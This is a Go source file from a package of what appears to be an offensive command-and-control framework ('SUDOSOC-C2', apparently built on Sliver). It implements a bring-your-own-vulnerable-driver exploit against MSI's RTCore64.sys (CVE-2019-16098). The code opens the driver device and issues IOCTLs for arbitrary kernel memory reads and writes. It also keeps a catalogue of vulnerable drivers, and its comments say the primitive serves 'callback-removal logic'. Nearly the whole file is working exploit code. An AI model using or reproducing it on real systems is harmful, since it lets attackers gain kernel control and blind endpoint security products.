package byovd

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// RTCore64.sys kernel memory read/write primitive.
//
// RTCore64.sys is the signed kernel driver shipped with MSI Afterburner
// (versions <= 4.6.4). It exposes two IOCTLs that allow an unprivileged
// process to perform arbitrary physical and virtual kernel memory reads
// and writes without any access checks.
//
// CVE-2019-16098 documents this vulnerability.
//
// IOCTL codes (x64):
//   0x80002048  — read  kernel memory  (RTCoreMemRead)
//   0x8000204c  — write kernel memory  (RTCoreMemWrite)
//
// Both IOCTLs operate on the same request structure (RTCoreMemReq).
// The Address field is the virtual kernel address to operate on; Size
// is 1, 2, 4, or 8 bytes; Value is both the source (write) and
// destination (read) of the data.

import (
	"fmt"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

const (
	ioctlRTCoreRead  = uintptr(0x80002048)
	ioctlRTCoreWrite = uintptr(0x8000204c)
	rtcoreDeviceName = `\\.\RTCore64`
)

// rtcoreMemReq mirrors the IOCTL input/output buffer layout expected by
// RTCore64.sys. Padding bytes match the driver's struct alignment.
type rtcoreMemReq struct {
	Pad0    [8]byte
	Address uint64
	Pad1    [4]byte
	Size    uint32
	Value   uint64
	Pad2    [4]byte
}

// RTCoreDevice wraps a handle to the RTCore64 device and exposes typed
// ReadQword / WriteQword helpers used by the callback-removal logic.
type RTCoreDevice struct {
	handle windows.Handle
}

// OpenRTCore opens a handle to the RTCore64 device. The driver must be
// loaded before calling this function.
func OpenRTCore() (*RTCoreDevice, error) {
	namePtr, _ := windows.UTF16PtrFromString(rtcoreDeviceName)
	h, err := windows.CreateFile(
		namePtr,
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		0,
		nil,
		windows.OPEN_EXISTING,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err != nil {
		return nil, fmt.Errorf("open RTCore64 device: %w", err)
	}
	return &RTCoreDevice{handle: h}, nil
}

// Close releases the device handle.
func (d *RTCoreDevice) Close() {
	if d.handle != 0 {
		windows.CloseHandle(d.handle)
		d.handle = 0
	}
}

// ReadQword reads 8 bytes from kernel virtual address addr.
func (d *RTCoreDevice) ReadQword(addr uint64) (uint64, error) {
	req := rtcoreMemReq{
		Address: addr,
		Size:    8,
	}
	return d.ioctl(ioctlRTCoreRead, &req)
}

// WriteQword writes 8 bytes to kernel virtual address addr.
func (d *RTCoreDevice) WriteQword(addr, value uint64) error {
	req := rtcoreMemReq{
		Address: addr,
		Size:    8,
		Value:   value,
	}
	_, err := d.ioctl(ioctlRTCoreWrite, &req)
	return err
}

// ReadDword reads 4 bytes from kernel virtual address addr.
func (d *RTCoreDevice) ReadDword(addr uint64) (uint32, error) {
	req := rtcoreMemReq{
		Address: addr,
		Size:    4,
	}
	v, err := d.ioctl(ioctlRTCoreRead, &req)
	return uint32(v), err
}

func (d *RTCoreDevice) ioctl(code uintptr, req *rtcoreMemReq) (uint64, error) {
	var bytesReturned uint32
	sz := uint32(unsafe.Sizeof(*req))
	err := windows.DeviceIoControl(
		d.handle,
		uint32(code),
		(*byte)(unsafe.Pointer(req)),
		sz,
		(*byte)(unsafe.Pointer(req)),
		sz,
		&bytesReturned,
		nil,
	)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[byovd] RTCore IOCTL 0x%x error: %v", code, err)
		// {{end}}
		return 0, err
	}
	return req.Value, nil
}

// DriverDesc describes a known vulnerable driver.
type DriverDesc struct {
	Name        string
	ServiceName string // short, used as SCM service name
	DevicePath  string // \\.\<name> used to open the device
	Open        func(svcName string) (KernelRW, error)
}

// KernelRW is the common interface both RTCore64 and future drivers expose.
type KernelRW interface {
	ReadQword(addr uint64) (uint64, error)
	WriteQword(addr, value uint64) error
	ReadDword(addr uint64) (uint32, error)
	Close()
}

// KnownDrivers is the built-in catalogue of supported vulnerable drivers.
// Operators supply the driver binary; Sliver supplies the IOCTL knowledge.
var KnownDrivers = []DriverDesc{
	{
		Name:        "RTCore64",
		ServiceName: "RTCore64",
		DevicePath:  rtcoreDeviceName,
		Open: func(_ string) (KernelRW, error) {
			return OpenRTCore()
		},
	},
}
